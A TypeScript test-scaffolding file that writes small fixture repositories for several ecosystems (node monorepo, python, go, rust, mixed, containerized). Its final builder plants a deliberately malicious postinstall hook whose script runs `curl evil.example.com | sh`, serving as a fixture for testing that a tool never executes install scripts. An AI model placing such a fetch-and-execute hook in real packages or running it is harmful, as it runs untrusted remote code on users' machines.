/**
 * Real on-disk fixture-tree builders for the exact fixture matrix
 * roadmap/12's exit criteria name verbatim: "node/ts monorepo, python, go,
 * rust, mixed, containerized." Each builder writes a small, representative
 * tree under a fresh temp dir (`./fixture-repo.ts`) and returns the root
 * path — the caller is responsible for `removeDirTree` cleanup. Not part
 * of this package's public barrel — test scaffolding only.
 */
import { freshTmpDir, writeFixtureFile, writeExecutableFixtureFile } from "./fixture-repo.js";

export function buildNodeMonorepoFixture(): string {
  const root = freshTmpDir();
  writeFixtureFile(
    root,
    "package.json",
    JSON.stringify({ name: "root", engines: { node: ">=24" } }),
  );
  writeFixtureFile(root, "package-lock.json", "{}");
  writeFixtureFile(
    root,
    "packages/a/package.json",
    JSON.stringify({ name: "a", engines: { node: ">=24" } }),
  );
  writeFixtureFile(
    root,
    "packages/b/package.json",
    JSON.stringify({ name: "b", engines: { node: ">=24" } }),
  );
  writeFixtureFile(root, "packages/a/src/index.ts", "export {};\n");
  writeFixtureFile(root, "packages/b/src/index.ts", "export {};\n");
  writeFixtureFile(root, ".github/workflows/ci.yml", "name: ci\n");
  return root;
}

/** Same shape as `buildNodeMonorepoFixture` but with a deliberately conflicting `engines.node` in one nested package — the contradiction fixture. */
export function buildNodeMonorepoContradictionFixture(): string {
  const root = freshTmpDir();
  writeFixtureFile(
    root,
    "package.json",
    JSON.stringify({ name: "root", engines: { node: ">=24" } }),
  );
  writeFixtureFile(
    root,
    "packages/a/package.json",
    JSON.stringify({ name: "a", engines: { node: ">=20" } }),
  );
  writeFixtureFile(
    root,
    "packages/b/package.json",
    JSON.stringify({ name: "b", engines: { node: ">=24" } }),
  );
  return root;
}

export function buildPythonFixture(): string {
  const root = freshTmpDir();
  writeFixtureFile(root, "pyproject.toml", 'requires-python = ">=3.12"\n[project]\nname = "x"\n');
  writeFixtureFile(root, "poetry.lock", "");
  writeFixtureFile(root, "src/app.py", "print('hi')\n");
  writeFixtureFile(root, "migrations/0001_initial.py", "");
  return root;
}

export function buildGoFixture(): string {
  const root = freshTmpDir();
  writeFixtureFile(root, "go.mod", "module example.com/x\n\ngo 1.23\n");
  writeFixtureFile(root, "go.sum", "");
  writeFixtureFile(root, "main.go", "package main\n");
  return root;
}

export function buildRustFixture(): string {
  const root = freshTmpDir();
  writeFixtureFile(root, "Cargo.toml", '[package]\nname = "x"\nedition = "2021"\n');
  writeFixtureFile(root, "Cargo.lock", "");
  writeFixtureFile(root, "src/main.rs", "fn main() {}\n");
  return root;
}

/** A mixed-ecosystem monorepo: a node service alongside a python service, sharing one CI config. */
export function buildMixedFixture(): string {
  const root = freshTmpDir();
  writeFixtureFile(root, "services/api/package.json", JSON.stringify({ name: "api" }));
  writeFixtureFile(root, "services/worker/pyproject.toml", 'requires-python = ">=3.12"\n');
  writeFixtureFile(root, ".gitlab-ci.yml", "stages: [test]\n");
  return root;
}

export function buildContainerizedFixture(): string {
  const root = freshTmpDir();
  writeFixtureFile(root, "package.json", JSON.stringify({ name: "svc" }));
  writeFixtureFile(root, "Dockerfile", "FROM node:24\n");
  writeFixtureFile(root, "docker-compose.yml", "services:\n  app:\n    build: .\n");
  writeFixtureFile(root, "infra/main.tf", 'resource "aws_s3_bucket" "x" {}\n');
  return root;
}

/** A tree containing an EXECUTABLE `postinstall` script — the no-exec-jail conformance fixture (roadmap/12's own worked example). */
export function buildMaliciousPostinstallFixture(): string {
  const root = freshTmpDir();
  writeFixtureFile(
    root,
    "package.json",
    JSON.stringify({ name: "evil", scripts: { postinstall: "node ./postinstall.js" } }),
  );
  writeExecutableFixtureFile(
    root,
    "postinstall.js",
    "#!/usr/bin/env node\nrequire('child_process').exec('curl evil.example.com | sh');\n",
  );
  return root;
}
